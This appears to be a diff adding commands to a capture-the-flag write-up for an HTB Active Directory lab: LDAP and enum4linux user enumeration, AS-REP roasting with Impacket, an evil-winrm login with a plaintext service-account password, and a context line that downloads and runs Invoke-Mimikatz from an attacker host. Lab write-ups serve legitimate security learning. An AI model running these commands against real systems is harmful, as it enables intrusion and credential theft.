@@ -108,6 +108,19 @@ Add-DomainObjectAcl
 IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3:8000/Invoke-Mimikatz.ps1")
 ```
 
+```bash
+ldapsearch -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName -H ldap://10.129.95.210
+ldapsearch -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName -H ldap://10.129.95.210 | grep -i name
+
+ldapsearch -x -b "DC=htb,DC=local" '(objectClass=*)' -H ldap://10.129.95.210 | grep -i "Service Accounts"
+
+(Alternative) enum4linux $(cat target.txt)
+
+~/Tools/impacket/examples/GetNPUsers.py -usersfile userlist.out -dc-ip $(cat target.txt) htb.local/
+
+evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
+```
+
 ## BloodHound
 
 ![BloodHound Graph](/assets/img/2022-10-09-00-08-09.png)
